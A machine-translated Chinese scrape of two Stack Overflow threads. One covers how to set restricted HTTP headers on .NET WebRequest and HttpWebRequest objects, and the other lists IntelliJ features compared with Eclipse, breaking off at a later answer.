我尝试`Headers`使用 Add() 方法将新值添加到集合中，但仍然遇到相同的异常。

```
webRequest.Headers.Add(HttpRequestHeader.Referer, "http://stackoverflow.com"); 
```

我可以通过将 WebRequest 对象转换为 HttpWebRequest 并设置诸如 之类的属性来解决此问题`httpWebReq.Referer ="http://stackoverflow.com"`，但这仅适用于通过属性公开的少数标头。

我想知道是否有办法通过请求远程资源来更精细地控制修改标头。

* * *

## 回答 #1

> 赞同：184
> 
> 时间：2011-01-20T20:44:03.300

如果您需要简短的技术性答案，请直接阅读答案的最后一部分。

如果您想了解更多，请阅读全部内容，希望您会喜欢...

* * *

我今天也反驳了这个问题，我今天发现的是：

1.  上面的答案都是正确的，因为：

    1.1 它告诉您您尝试添加的标头已经存在，然后您应该使用适当的属性（例如索引器）修改其值，而不是尝试再次添加它。

    1.2 每当您更改 的标题时`HttpWebRequest`，您需要在对象本身上使用适当的属性（如果存在）。

感谢 FOR 和 Jvenema 的领先指导方针......

2.  但是，我发现，**这是拼图中缺失的部分**：

    2.1`WebHeaderCollection`类一般通过`WebRequest`.Headers或`WebResponse`.Headers访问。**一些常见的标头被认为是受限制的，它们要么直接由 API 公开（例如 Content-Type），要么受系统保护且无法更改。**

受限制的标头是：

*   `Accept`
*   `Connection`
*   `Content-Length`
*   `Content-Type`
*   `Date`
*   `Expect`
*   `Host`
*   `If-Modified-Since`
*   `Range`
*   `Referer`
*   `Transfer-Encoding`
*   `User-Agent`
*   `Proxy-Connection`

* * *

因此，下次您遇到此异常并且不知道如何解决此问题时，请记住有一些受限制的标头，解决方案是使用`WebRequest`/`HttpWebRequest`类中的适当属性显式修改它们的值。

* * *

编辑：（有用，来自评论，用户[Kaido](https://stackoverflow.com/questions/239725/cannot-set-some-http-headers-when-using-system-net-webrequest#comment15470171_4752359)的评论）

> `WebHeaderCollection.IsRestricted(key)`解决方案是在调用 add 之前检查标头是否已经存在或被限制（ ）

* * *

## 回答 #2

> 赞同：80
> 
> 时间：2010-03-08T23:47:55.933

我在使用自定义 Web 客户端时遇到了这个问题。我认为人们可能会因为有多种方法而感到困惑。使用时，`WebRequest.Create()`您可以强制转换为`HttpWebRequest`并使用该属性来添加或修改标题。使用 a 时，`WebHeaderCollection`您可以使用`.Add("referer","my_url")`.

例 1

```
WebClient client = new WebClient();
client.Headers.Add("referer", "http://stackoverflow.com");
client.Headers.Add("user-agent", "Mozilla/5.0"); 
```

前 2

```
HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
request.Referer = "http://stackoverflow.com";
request.UserAgent = "Mozilla/5.0";
response = (HttpWebResponse)request.GetResponse(); 
```

* * *

## 回答 #3

> 赞同：33
> 
> 时间：2014-04-14T21:37:42.417

之前的所有答案都描述了问题而没有提供解决方案。这是一种扩展方法，通过允许您通过其字符串名称设置任何标题来解决问题。

**用法**

```
HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;
request.SetRawHeader("content-type", "application/json"); 
```

**扩展类**

```
public static class HttpWebRequestExtensions
{
    static string[] RestrictedHeaders = new string[] {
            "Accept",
            "Connection",
            "Content-Length",
            "Content-Type",
            "Date",
            "Expect",
            "Host",
            "If-Modified-Since",
            "Keep-Alive",
            "Proxy-Connection",
            "Range",
            "Referer",
            "Transfer-Encoding",
            "User-Agent"
    };

    static Dictionary<string, PropertyInfo> HeaderProperties = new Dictionary<string, PropertyInfo>(StringComparer.OrdinalIgnoreCase);

    static HttpWebRequestExtensions()
    {
        Type type = typeof(HttpWebRequest);
        foreach (string header in RestrictedHeaders)
        {
            string propertyName = header.Replace("-", "");
            PropertyInfo headerProperty = type.GetProperty(propertyName);
            HeaderProperties[header] = headerProperty;
        }
    }

    public static void SetRawHeader(this HttpWebRequest request, string name, string value)
    {
        if (HeaderProperties.ContainsKey(name))
        {
            PropertyInfo property = HeaderProperties[name];
            if (property.PropertyType == typeof(DateTime))
                property.SetValue(request, DateTime.Parse(value), null);
            else if (property.PropertyType == typeof(bool))
                property.SetValue(request, Boolean.Parse(value), null);
            else if (property.PropertyType == typeof(long))
                property.SetValue(request, Int64.Parse(value), null);
            else
                property.SetValue(request, value, null);
        }
        else
        {
            request.Headers[name] = value;
        }
    }
} 
```

**场景**

我为我编写了一个包装器，`HttpWebRequest`并且不想将所有 13 个受限标头作为我的包装器中的属性公开。相反，我想使用一个简单的`Dictionary<string, string>`.

另一个示例是 HTTP 代理，您需要在请求中获取标头并将它们转发给接收者。

在许多其他场景中，它只是不切实际或无法使用属性。强制用户通过属性设置标题是一种非常不灵活的设计，这就是需要反射的原因。好处是反射被抽象掉了，它仍然很快（在我的测试中是 0.001 秒），并且作为一种扩展方法感觉很自然。

**笔记**

根据 RFC，标头名称不区分大小写，[http://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2](http://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2)

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2016-03-16T14:27:40.243

当我的代码尝试像这样设置“Accept”标头值时，我遇到了同样的异常：

```
WebRequest request = WebRequest.Create("http://someServer:6405/biprws/logon/long");
request.Headers.Add("Accept", "application/json"); 
```

解决方案是将其更改为：

```
HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://someServer:6405/biprws/logon/long");
request.Accept = "application/json"; 
```

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2008-12-01T16:20:18.530

每当您更改 的标头时`HttpWebRequest`，都需要在对象本身上使用适当的属性（如果存在）。如果您有一个 plain `WebRequest`，请务必将其转换为`HttpWebRequest`第一个。然后`Referrer`在您的情况下可以通过 访问`((HttpWebRequest)request).Referrer`，因此您无需直接修改标题 - 只需将属性设置为正确的值即可。`ContentLength`, `ContentType`,`UserAgent`等都需要这样设置。

恕我直言，这是 MS 部分的一个缺点......通过设置标题`Headers.Add()`应该自动在幕后调用适当的属性，如果这是他们想要做的。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2008-10-27T12:37:59.763

[WebRequest](http://msdn.microsoft.com/en-us/library/system.net.webrequest(VS.71).aspx)是抽象的（并且由于任何继承类都必须覆盖 Headers 属性）..您使用的是哪个具体的 WebRequest ？换句话说，你如何让那个 WebRequest 对象使用？

ehr .. mnour 的回答让我意识到您收到的错误消息实际上是正确的：它告诉您您尝试添加的标头已经存在，然后您应该使用适当的属性（例如索引器）修改它的值)，而不是尝试再次添加它。这可能就是你要找的所有东西。

从 WebRequest 继承的其他类可能具有更好的属性来包装某些标头；例如看[这篇文章](http://weblogs.asp.net/cazzu/archive/2007/07/30/setting-http-headers-in-net-this-header-must-be-modified-using-the-appropriate-property.aspx)。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2014-12-30T17:35:03.833

上面的答案都很好，但问题的本质是一些标题设置为一种方式，而另一些则设置为另一种方式。有关“受限标题”列表，请参见上文。对于这些，您只需将它们设置为属性。对于其他人，您实际上添加了标题。看这里。

```
 request.ContentType = "application/x-www-form-urlencoded";

    request.Accept = "application/json";

    request.Headers.Add(HttpRequestHeader.Authorization, "Basic " + info.clientId + ":" + info.clientSecret); 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-27T13:19:27.950

基本上，没有。那是一个http标头，因此可以合理地转换为`HttpWebRequest`并设置`.Referer`（如您在问题中指出的那样）：

```
HttpWebRequest req = ...
req.Referer = "your url"; 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2019-10-28T04:34:45.653

注意：此解决方案将与 WebClientSocket 以及 HttpWebRequest 或任何其他使用 WebHeaderCollection 处理标头的类一起使用。

如果您查看 WebHeaderCollection.cs 的源代码，您会看到 Hinfo 用于保存所有已知标头的信息：

```
private static readonly HeaderInfoTable HInfo = new HeaderInfoTable(); 
```

查看 HeaderInfoTable 类，您可以注意到所有数据都存储在哈希表中

```
private static Hashtable HeaderHashTable; 
```

此外，在 HeaderInfoTable 的静态构造器中，您可以看到所有已知的标题都添加到 HeaderInfo 数组中，然后复制到哈希表中。

最后看看 HeaderInfo 类显示了字段的名称。

```
internal class HeaderInfo {

    internal readonly bool IsRequestRestricted;
    internal readonly bool IsResponseRestricted;
    internal readonly HeaderParser Parser;

    //
    // Note that the HeaderName field is not always valid, and should not
    // be used after initialization. In particular, the HeaderInfo returned
    // for an unknown header will not have the correct header name.
    //

    internal readonly string HeaderName;
    internal readonly bool AllowMultiValues;
    ...
    } 
```

因此，综上所述，这里有一个代码，它使用反射在 HeaderInfoTable 类中查找静态 Hashtable，然后将哈希表中每个请求限制的 HeaderInfo 更改为不受限制

```
 // use reflection to remove IsRequestRestricted from headerInfo hash table
        Assembly a = typeof(HttpWebRequest).Assembly;
        foreach (FieldInfo f in a.GetType("System.Net.HeaderInfoTable").GetFields(BindingFlags.NonPublic | BindingFlags.Static))
        {
            if (f.Name == "HeaderHashTable")
            {
                Hashtable hashTable = f.GetValue(null) as Hashtable;
                foreach (string sKey in hashTable.Keys)
                {

                    object headerInfo = hashTable[sKey];
                    //Console.WriteLine(String.Format("{0}: {1}", sKey, hashTable[sKey]));
                    foreach (FieldInfo g in a.GetType("System.Net.HeaderInfo").GetFields(BindingFlags.NonPublic | BindingFlags.Instance))
                    {

                        if (g.Name == "IsRequestRestricted")
                        {
                            bool b = (bool)g.GetValue(headerInfo);
                            if (b)
                            {
                                g.SetValue(headerInfo, false);
                                Console.WriteLine(sKey + "." + g.Name + " changed to false");
                            }

                        }
                    }

                }
            }
        } 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2015-03-11T17:16:47.747

我只使用：

```
request.ContentType = "application/json; charset=utf-8" 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2015-04-24T14:48:42.160

您可以将 WebRequest 转换为 HttpWebRequest，如下所示：

```
var request = (HttpWebRequest)WebRequest.Create(myUri); 
```

然后不是试图操纵标头列表，而是直接在请求属性request.Referer中应用它：

```
request.Referer = "yourReferer"; 
```

这些属性在请求对象中可用。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2020-11-25T08:19:56.957

我在为我工作的一段代码下面遇到了同样的问题

```
HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

request.Headers["UserAgent"] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; 
Trident/5.0)" 
```

# java - IntelliJ 中可能发生的事情在 Eclipse 中是不可能的？

> ID：239732
> 
> 赞同：365
> 
> 时间：2008-10-27T12:36:21.593
> 
> 标签：java, eclipse, ide, intellij-idea

我从那些改变了任何一种方式并且对其中一种发誓的人那里听说过。

作为一个巨大的 Eclipse 粉丝，但还没有时间尝试 IntelliJ，我很想听听“前 Eclipsians”的 IntelliJ 用户的一些具体事情，这些事情你可以用 IntelliJ 做而你不能用 Eclipse 做。

**注意**：这不是一个主观问题，也根本不是要变成 IDE 圣战。***请对任何火焰诱饵答案投反对票***。

* * *

## 回答 #1

> 赞同：185
> 
> 时间：2008-10-27T20:00:16.220

## CTRL-单击可在任何地方使用

CTRL-click 将您带到定义单击对象的位置 - 不仅在 Java 代码中的 Java 类和变量中，而且在 Spring 配置中（您可以单击类名、属性或 bean 名），在 Hibernate 中（您可以单击属性名称或类，或包含的资源），您可以一键从 Java 类导航到它用作 Spring 或 Hibernate bean 的位置；单击包含的 JSP 或 JSTL 标记也有效，按住 ctrl-单击 JavaScript 变量或函数会将您带到定义它的位置，如果有多个位置，则显示菜单，包括其他 .js 文件和 HTML 或 JSP 中的 JS 代码文件。

## 多种语言的自动完成

### 休眠

在 HSQL 表达式中自动完成，在 Hibernate 配置中（包括类、属性和 DB 列名），在 Spring 配置中

```
<property name="propName" ref="<hit CTRL-SPACE>" 
```

它将向您显示可以注入该属性的那些 bean 的列表。

### 爪哇

Java 代码中非常智能的自动完成功能：

```
interface Person {
    String getName();
    String getAddress();
    int getAge();
}
//---
Person p;
String name = p.<CTRL-SHIFT-SPACE> 
```

它只向您显示*getName()*、*getAddress()*和*toString()*（仅它们在类型上兼容），并且*getName()*在列表中排在第一位，因为它具有更相关的名称。仍在 EAP 中的最新版本 8 具有更智能的自动完成功能。

```
interface Country{
}
interface Address {
    String getStreetAddress();
    String getZipCode();
    Country getCountry();
}
interface Person {
    String getName();
    Address getAddress();
    int getAge();
}
//--- 
Person p;
Country c = p.<CTRL-SHIFT-SPACE> 
```

它会默默地自动完成它

```
Country c = p.getAddress().getCountry(); 
```

### Javascript

JavaScript 中的智能自动完成功能。

```
function Person(name,address) {
    this.getName = function() { return name };
    this.getAddress = function() { return address };
}

Person.prototype.hello = function() {
    return "I'm " + this.getName() + " from " + this.get<CTRL-SPACE>;
} 
```

并且它只显示*getName()*和*getAddress()*，无论您在项目中的其他 JS 对象中使用的 get* 方法如何，并且 ctrl-click on *this.getName()*会将您带到定义这个的位置，即使您的项目中还有其他一些*getName()*函数。

### HTML

我是否提到了文件路径中的自动完成和 ctrl 单击，例如 <script src=""、<img src="" 等？

HTML 标记属性中的自动完成功能。HTML 标记的样式属性中的自动完成，包括属性名称和值。类属性中的自动完成也是如此。
键入 <div class="<CTRL-SPACE>，它将显示项目中定义的 CSS 类的列表。选择一个，按住 ctrl 单击它，您将被重定向到定义它的位置。

### 简单的母语突出显示

最新版本具有语言注入功能，因此您可以声明您的自定义 JSTL 标记通常包含 JavaScript，并且它会突出显示其中的 JavaScript。

```
<ui:obfuscateJavaScript>function something(){...}</ui:obfuscateJavaScript> 
```

## 跨所有项目的索引搜索。

您可以使用任何 Java 类或方法的 Find Usages，它会找到它的使用位置，不仅包括 Java 类，还包括 Hibernate、Spring、JSP 和其他地方。重命名方法重构不仅在 Java 类中重命名方法，而且在包括注释在内的任何地方重命名方法（不能确定注释中的字符串是否真的是方法名称，所以它会询问）。即使有另一个同名的类的方法，它也只会找到你的方法。良好的源代码控制集成（SVN 是否支持更改列表？IDEA 支持它们用于每个源代码控制），能够使用您的更改创建补丁，这样您就可以将更改发送给其他团队成员而无需提交它们。

## 改进的调试器

当我在调试器的监视窗口中查看*HashMap*时，我看到了逻辑视图 - 键和值，上次我在 Eclipse 中这样做时，它显示了带有哈希和下一个字段的条目 - 我并不是真的在调试*HashMap*，我只是想看看它的内容。

## Spring & Hibernate 配置验证

它在您编辑时验证 Spring 和 Hibernate 配置，因此我无需重新启动服务器即可知道我拼错了类名，或者添加了构造函数参数，因此我的 Spring cfg 无效。

上次尝试时，我无法在 Windows XP x64 上运行 Eclipse。

它会建议你*person.name*或*person.address*。按住 Ctrl 键单击*person.name*，它将导航到*Person*类的*getName()*方法。

 *在此处键入`Pattern.compile("");`put \\，按 CTRL-SPACE 并查看有关您可以在正则表达式中放入什么内容的有用提示。您还可以在此处使用语言注入 - 定义您自己的采用字符串参数的方法，在 IntelliLang 选项对话框中声明您的参数是正则表达式 - 它也会在那里为您提供自动完成功能。不用说它突出了不正确的正则表达式。

## 其他特性

我不确定Eclipse中是否存在一些功能。但至少我们团队中使用 Eclipse 的每个成员也使用一些合并工具将本地更改与源代码控制中的更改合并，通常是 WinMerge。我从不需要它——合并 IDEA 对我来说就足够了。单击 3 次，我可以在源代码管理中查看文件版本列表，再单击 3 次，我可以比较以前的版本，或者以前和当前的版本，并可能合并。

它允许指定我需要`WEB-INF\lib`文件夹内的所有 .jar，而无需单独选择每个文件，因此当有人将新的 .jar 提交到该文件夹​​时，它会自动将其拾取。

上面提到的可能是它所做工作的 10%。我不使用 Maven、Flex、Swing、EJB 和许多其他东西，所以我不知道它对它们有什么帮助。但确实如此。

* * *

## 回答 #2

> 赞同：81
> 
> 时间：2009-02-07T05:21:48.773

我使用 intellij 而不是 eclipse 只有一个原因：*可用性*

无论是调试、重构、自动完成.. Intellij 更容易使用一致的键绑定、可用的选项等。在功能方面，intellij 很难赶上 Eclipse，因为后者具有比 intellij 更多的可用插件，并且易于扩展。

* * *

## 回答 #3

> 赞同：54
> 
> 时间：2008-10-27T20:25:47.137

可能不是**什么**可以/不能做什么的问题，而是**如何**。

例如，两者都有编辑器，周围有项目、类路径、输出、结构等的停靠面板。但是在 Idea 中，当我开始键入所有这些时，自动折叠让我专注于它自己的代码；在 Eclipse 中，所有这些面板都保持打开状态，使我的编辑器区域非常小，大约是总可视区域的 1/5。所以我必须抓住鼠标并单击以在这些面板中最小化。整天这样做是 eclipse 中非常令人沮丧的经历。

视图输出窗口会发生完全相反的情况。在 Idea 中，运行程序会带来输出窗口/面板以查看程序的输出，即使它以前被最小化。在eclipse中我必须再次抓住我的鼠标并寻找输出选项卡并单击它来查看我的程序输出，因为输出窗口/面板只是另一个，就像所有其他窗口一样，但在Idea中它被处理一种特殊的方式：“如果用户想运行他的程序，很可能他想看到那个程序的输出！” 当我写它的时候它看起来很自然，但是 eclipse 在这个基本的用户界面概念上失败了。

可能在 Eclipse 中有一个快捷方式（编辑时自动隐藏输出窗口并在运行程序时自动显示它），但作为其他几十个功能，必须在论坛、在线帮助等中寻找快捷方式，而在 Idea 中则更多”自然”。

这可以重复几乎所有的功能，自动完成，自动换行，快速文档视图，一切。我认为在 Idea 中的用户体验比在 eclipse 中要愉快得多。然后座右铭成真“快乐发展”

Eclipse 可以处理更快的大型项目（+300 个 jar 和 +4000 个类），我认为 IntelliJ Idea 8 正在解决这个问题。

这一切当然是主观的。我们如何衡量用户体验？

* * *

## 回答 #4

> 赞同：44
> 
> 时间：2009-01-20T13:20:53.293

Idea 8.0 具有可爱的`ctrl+shift+space`x 2，它执行以下自动完成功能：

```
 City city = customer.<ctrl-shift-space twice> 
```

解决为

```
 City city = customer.getAddress().getCity(); 
```

通过任意数量的 getter/setter 级别。

* * *

## 回答 #5

> 赞同：33
> 
> 时间：2008-11-24T05:18:58.863

不要忘记“与剪贴板比较”。

我在 IntelliJ 中一直使用的东西，在 Eclipse 中没有等价物。

* * *

## 回答 #6

> 赞同：31
> 
> 时间：2009-05-20T01:43:19.210

我在 IntelliJ 中最喜欢的快捷方式在 Eclipse 中没有（我发现）被称为“转到符号”。 `CTRL-ALT-SHIFT-N`允许您从整个项目中开始输入和查找类、方法名、变量名等。

* * *

## 回答 #7

> 赞同：27
> 
> 时间：2013-05-18T12:19:17.700

由于新的 Android Studio，我尝试切换到 IntelliJ。但我现在非常失望。我正在使用带有**Code Recommanders**插件的 Eclipse。这是一个为什么 Eclipse 如此出色的简单示例：

我想创建一个新的`SimpleTimeZone`. `SimpleTimeZone`没有零参数的构造函数。

`Ctrl + Space`在日食中

![在此处输入图像描述](https://i.stack.imgur.com/RAmrm.png)

`Ctrl + Space`在 IntelliJ 中

![在此处输入图像描述](https://i.stack.imgur.com/HLH3M.png)

在 IntelliJ 中，我没有得到任何构造函数类型的信息`SimpleTimeZone`。

在`Enter`Eclipse之后

![在此处输入图像描述](https://i.stack.imgur.com/Rqj5y.png)

我得到了先前选择的构造函数，其中填充了预定义的变量名称。我可以看到每个参数的类型。使用 Code Recommanders，Eclipse 通过当前范围内先前定义的变量类型猜测正确的构造函数，并用这些 var 填充构造函数。

在`Enter`IntelliJ 之后没有任何反应。我得到一个空的构造函数。我必须按下`Ctrl + P`才能看到预期的论点。

![在此处输入图像描述](https://i.stack.imgur.com/Ky67Y.png)

* * *

## 回答 #8

> 赞同：25
> 
> 时间：2008-10-27T21:47:19.530

如果您将光标放在方法上，`CTRL+SHIFT+I`则将弹出方法实现。如果该方法是一个`interface`方法，那么您可以使用向上和向下箭头在实现中循环：

```
Map<String, Integer> m = ...
m.contains|Key("Wibble"); 
```

地点 | 是（例如）您的光标所在的位置。

* * *

## 回答 #9

> 赞同：24
> 
> 时间：2008-10-27T12:58:46.853

IntelliJ 有一些非常高级的代码检查（与 FindBugs 类似但不同）。

虽然我在使用 IntelliJ 时严重错过了 FindBugs 插件（Eclipse/FindBugs 集成非常酷）。

[这](http://www.jetbrains.com/idea/documentation/inspections.jsp)是 IntelliJ 支持的 CodeInspection 的官方列表

编辑：最后，IntelliJ 有一个[findbugs-plugin](http://plugins.intellij.net/plugin/?id=3847)。它仍然是一个测试版，但代码检查和 FindBugs 的结合真是太棒了！

* * *

## 回答 #10

> 赞同：16
> 
> 时间：2009-02-11T15:44:19.360

远，远，更多的重构。

* * *

## 回答 #11

> 赞同：15
> 
> 时间：2008-11-11T22:11:47.990

我经常使用的一件事是设置断点，然后控制它的作用。（在我上一份工作中，其他大多数人都使用 Eclipse……我记得很惊讶没有人能在 Eclipse 中找到如何做到这一点。）

例如，可以让断点实际上不停止，而只是将消息记录到控制台。这意味着，我不必在代码中乱扔“System.out.println(...)”然后重新编译。

* * *

## 回答 #12

> 赞同：15
> 
> 时间：2010-05-31T16:07:50.530

想法以更简单的方式解决了许多问题，或者没有等价物：

*   自动完成操作：`ctrl+shift+a`您是否可以从键盘调用任何想法操作而无需记住其组合键...想想 Windows 中的 gnome-do 或 launchy，您就有了想法！此外，此功能支持 CamelCasing 缩写；）

*   Shelf：让您可以轻松地将一些代码分开，然后通过差异查看器查看它们。

*   本地历史：管理得更好，更简单。

*   SVN 注释和历史记录：更易于检查，并且您可以轻松地查看整个源文件的这一部分的历史记录。

*   随处自动完成，例如评估表达式和断点条件窗口。

*   Maven 集成……简单得多，而且集成得很好。

*   重构更接近手，例如循环插入、包装/转换、重命名和添加变量。

*   发现功能强大且组织良好。即使在大项目中

*   同时与大型项目的多个分支一起工作非常稳定（作为分支源的 1.5Gb 前错误修复程序，并且需要同时在它们中工作，idea 显示了其坚如磐石的能力）

*   更简洁的界面...

*   而且，仅使用键盘更简单，无需使用鼠标进行许多简单的任务，节省您的时间并让您更加专注于代码......这很重要！

而现在，开源...... Idea 用户群将成倍增长。

* * *

## 回答 #13

> 赞同：14
> 
> 时间：2008-10-27T20:59:23.387

结构搜索和替换。

例如，搜索类似的内容：

```
 System.out.println($string$ + $expr$); 
```

其中 $string$ 是文字，$expr$ 是 my.package.and.Class 类型的表达式，然后替换为：

```
 $expr$.inspect($string$); 
```

* * *

## 回答 #14

> 赞同：13
> 
> 时间：2010-09-06T23:36:09.227

就这个线程而言，我的时间可能有点偏离，但我不得不做出回应。

我是 Eclipse 的忠实粉丝——自从它第一次出现就开始使用它。一位朋友当时（10 多年前）告诉我，这将是一名球员。他是对的。

然而！我刚刚开始使用 IntelliJ，如果您还没有看到或使用过**更改列表**，那么您就错过了编程天堂。

跟踪我更改的文件的能力（在我的开发分支 ala clearcase 上）是我在 eclipse 插件中寻找的东西。Intellij 跟踪一次提交的所有更改，非常容易。您可以使用自定义列表隔离更改的文件。我将它用于必须在本地唯一的配置文件，但在我同步或与存储库进行比较时会不断被标记——将它们列在更改列表下，我可以监控它们，但巧妙地将它们藏起来，这样我就可以专注于真正的添加我正在做。

此外，还有一个提交日志插件，可以为那些未与您的错误跟踪软件集成的 SCCS 输出所有更改的文本。将日志粘贴到工单的工作历史记录中会捕获文件、它们的版本、日期/时间和分支/标签。真是太酷了。

我敢打赌，所有这些都可以通过 eclipse 中的插件（或未来的增强功能）来支持；然而，Intellij 让这一切变得轻而易举。

最后，我对这个产品的主流喜爱感到非常兴奋——按键，所以它很痛苦，但很有趣。

* * *

## 回答 #15

> 赞同：12
> 
> 时间：2008-10-27T12:56:11.380

IntelliJ 调试器有一个非常方便的功能，叫做“评估表达式”，它比 eclipses 挂件要好得多。它具有完整的代码完成功能，我认为它通常“更有用”。

* * *

## 回答 #16

> 赞同：11
> 
> 时间：2008-10-27T18:31:43.637

好吧，对我来说，这是一千件小事。一些宏，Eclipse 中的一般 GUI 布局，我觉得很糟糕。我无法在 Eclipse 的不同窗口中打开多个项目。我可以打开多个项目，但是当我切换文件时，基于视图的系统会在我周围交换一堆东西。IntelliJ 的代码检查似乎更好。它用于解决常见问题的弹出助手非常好。很多简单的可用性信息，比如我可以将鼠标悬停在热点上的侧边栏，它会告诉我方法的每个实现子类或我正在实现的方法以及从哪里实现。

每当我不得不使用或观看某人使用 Eclipse 时，似乎他们可以完成我在 IntelliJ 中可以做的大部分事情，但它们需要的时间更长，而且更笨重。

* * *

## 回答 #17

> 赞同：9
> 
> 时间：2009-07-20T22:31:31.343

引入变量。（`Ctrl+Alt+V`在 Windows 上，`Cmd+Alt+V`在 OSX 上）

假设您调用了一个方法，`service.listAllPersons()` Hit `Ctrl+Alt+V`and `Enter`，并且插入了方法调用返回值的变量：

```
List<Person> list = service.listAllPersons(); 
```

节省您的输入，并且您不必检查您正在调用的方法的返回类型。在使用泛型时特别有用，例如

```
new ArrayList<String>() 
```

[引入变量]

```
ArrayList<String> stringArrayList = new ArrayList<String>(); 
```

（当然，您可以在点击之前轻松更改变量的名称`Enter`）

* * *

## 回答 #18

> 赞同：8
> 
> 时间：2008-10-27T12:45:33.087

IntelliJ 具有从代码到 jspx 文档的智能感知和重构支持。

* * *

## 回答 #19

> 赞同：7
> 
> 时间：2010-04-29T01:16:44.693

对我来说，这是对 IDEA 的 maven 支持，尤其是在版本 9 中是首屈一指的。项目与 maven 模型的即时同步非常棒，让开发变得愉快。

* * *

## 回答 #20

> 赞同：6
> 
> 时间：2010-02-18T14:09:14.763

Intellij 的 SVN 插件比 Subversive 或 Subclipse 好得多，而且它可以工作！我们浪费在使用 Eclipse 合并源文件上的时间是不值得考虑的。这不是 IntelliJ 的问题，因为该插件可以为您提供更多帮助。

此外，Subclipse 插件也不可靠——我们经常遇到插件认为其他开发人员没有将任何代码签入到 SVN 的情况，但是有——CI 服务器已经处理了它们！

* * *

## 回答 #21

> 赞同：4
> 
> 时间：2010-06-18T12:06:10.173

**VIM**模拟器。这个插件在 IDEA 中编辑文件时提供了几乎完整的 vi/vim/gvim 仿真。支持以下功能：

*   动作键
*   删除/更改
*   插入模式命令
*   分数
*   寄存器
*   VIM 撤消/重做
*   可视模式命令
*   一些 Ex 命令
*   一些 :set 选项
*   用于搜索和搜索/替换的完整 VIM 正则表达式
*   宏
*   图表
*   命令行历史
*   搜索历史记录
*   跳转列表
*   VIM 帮助

[来自http://plugins.jetbrains.net/plugin/?id=164](http://plugins.jetbrains.net/plugin/?id=164)关于这个插件的一些评论

由于这个插件，我看不到任何其他 ide ......两全其美......太棒了！这就是我在所有 IDE 中所缺乏的。

* * *

## 回答 #22

> 赞同：4
> 
> 时间：2011-02-10T15:34:37.930

我认为的优点之一是**依赖结构矩阵**： http: [//www.jetbrains.com/idea/features/dependency_analysis.html#link0](http://www.jetbrains.com/idea/features/dependency_analysis.html#link0)

Lattix 的网站（独立产品）中很好地介绍了 DSM 的使用和好处： [http ://www.lattix.com/files/dl/slides/s.php?directory=4tour](http://www.lattix.com/files/dl/slides/s.php?directory=4tour)

* * *

## 回答 #23

> 赞同：3
> 
> 时间：2008-12-23T16:49:59.313

其他几件事：

*   更改方法签名时传播参数/异常，对于更新调用堆栈深处的方法非常方便
*   作为参数传递给 jdbc 调用的字符串中的 SQL 代码验证（以及整个新捆绑的语言注入内容）
*   在接口和类（及其方法）和智能实现导航（Ctrl+Alt+Click 或 Ctrl+Alt+B）的图标中实现/覆盖
*   EJB 2.1 接口和 bean 类之间的链接（包括重构支持）；旧的，但在处理旧项目时仍然非常有价值

* * *

## 回答 #24

> 赞同：2
> 
> 时间：2008-10-29T02:44:56.950

IntelliJ 所做的 Eclipse 没有做的两件事对我来说非常有价值：

方法分隔符：方法之间那些模糊的灰线使代码*更具*可读性

文本抗锯齿：让代码在 IDE 中看起来很漂亮

* * *

## 回答 #25

> 赞同：2
> 
> 时间：2008-11-05T11:20:43.407

一个非常有用的功能是能够部分构建 Maven 反应器项目，以便只包含您需要的部分。

为了更清楚一点，考虑使用[覆盖技术在它们之间共享许多公共资源（例如 JavaScript、Spring 配置文件等）的 WAR 文件集合的情况](http://maven.apache.org/plugins/maven-war-plugin/examples/war-overlay.html). 如果您正在处理某个网页（在 Jetty 中运行）并且想要更改一些保存在单独模块中的覆盖代码，那么您通常希望必须停止 Jetty，运行 Maven 构建，再次启动 Jetty 并继续。Eclipse 和我使用过的几乎所有其他 IDE 都是这种情况。在 IntelliJ 中并非如此。使用项目设置，您可以定义您希望将哪个模块的哪个方面包含在后台构建中。因此，您最终会得到一个看起来无缝的过程。您对项目中的几乎所有代码进行了更改，并且在刷新浏览器后立即可用。

非常整洁，而且非常快。

我无法想象在没有它的情况下用 YUI 支持 DWR/SpringMVC 来编写前端。

* * *

## 回答 #26

> 赞同：2
> 
> 时间：2009-02-07T09:31:11.233

我在 IntelliJ 中一直使用的东西是在我输入时进行重构。我使用两个 IDE 从打印输出（最初用 eclipse 编写）重写了类，并且在 IntelliJ 中编写相同的类比使用 eclipse 少了大约 40% 的击键/鼠标点击。

在 Eclipse 支持使用不完整的代码进行尽可能多的重构之前，我不想使用它。

这是 IntelliJ 8.0/8.1 [ [http://www.jetbrains.com/idea/features/index.html]中更长的功能列表](http://www.jetbrains.com/idea/features/index.html])

* * *

## 回答 #27

> 赞同：2
> 
> 时间：2009-02-23T16:08:55.087

我的回答的序言：我对 Eclipse 的使用是有限的。我们需要一个 Java IDE 来同时在 Windows 和 Mac 上工作，而 Mac 端口的速度一天比一天慢。这是几年前的事了，我相信现在可以了。但这就是让我们改用 IntelliJ 的原因，我们对此很满意。

现在我的答案是：我还没有看到提到的一大区别是 IntelliJ/Jet Brains 的技术支持更好。我们向 JetBrains 发送了一封电子邮件，并在不到一个小时内得到了明确的答复。寻找 Eclipse 问题的答案通常会得到“你这个笨蛋”的答案（通常是少数回复）以及大量有见地、有用的回复。但是需要一些整理才能得到真正的答案。

* * *

## 回答 #28

> 赞同：2
> 
> 时间：2010-06-13T23:34:49.700

[数据流分析](http://en.wikipedia.org/wiki/Dataflow_analysis)：过程间逆向流分析和前向流分析，如此[处](http://blogs.jetbrains.com/idea/2009/08/analyzing-dataflow-with-intellij-idea/)所述。我的经验基于社区版，它可以很好地进行数据流分析。在代码非常复杂的少数情况下，它会失败（拒绝做任何事情）。

* * *

## 回答 #29

> 赞同：2
> 
